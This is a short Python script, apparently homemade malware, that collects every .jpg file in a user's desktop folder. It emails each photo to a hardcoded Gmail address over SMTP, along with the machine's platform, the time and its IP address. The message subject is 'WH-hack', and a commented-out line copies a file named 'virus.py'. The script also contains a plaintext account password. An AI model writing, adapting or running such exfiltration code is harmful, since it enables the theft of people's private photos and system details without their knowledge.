import os, shutil, sys, socket
import smtplib, datetime, platform
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
from email.mime.multipart import MIMEMultipart

ip = socket.gethostbyname(socket.getfqdn())
pt = "C:\\Users\\User\\Desktop\\demo\\IMG-20200512-WA0028.jpg"
directory = "C:\\Users\\User\\Desktop\\demo\\"
p = 'C:\\Users\\User\\Desktop\\demo\\w.txt'

for file in os.listdir(directory):
   if file.endswith(".jpg"):
      photos = os.path.join(file)
      fl = open('w.txt', 'a')
      fl.write(photos + '\n')
fil = open(p).readlines()
fil = [lens.rstrip()for lens in fil]

l = len(fil) + 1
line = l
i = 0

try:
    for i in range(line):
        now = datetime.datetime.now()
        log = 'eson3800@gmail.com'
        send = 'eson3800@gmail.com'

        msg = MIMEMultipart()
        msg['Subject'] = 'WH-hack'
        msg['From'] = log
        msg['To'] = send
        text = MIMEText('Платформа: '+platform.platform() +'\nВремя: '+
            now.strftime("%d-%m-%Y %H:%M:%S")+'\nИмя файла: '+fil[i]+'\nАдресс: '+ip)

        img_data = open(fil[i], 'rb').read()
        image = MIMEImage(img_data, name='photo')
        msg.attach(text)
        msg.attach(image)

        s = smtplib.SMTP("smtp.gmail.com", 587)
        s.ehlo()
        s.starttls()
        s.ehlo()
        s.login("eson3800@gmail.com","ERIK123454321")
        s.sendmail(log, send, msg.as_string())
        s.quit()
        print(str(i))
        i += 1
except:
    print('ERROR')
    
    


#КОПИЯ- shutil.copy("C:\\Users\\User\\Desktop\\demo\\virus.py", "C:\\Users\\User\\Desktop")  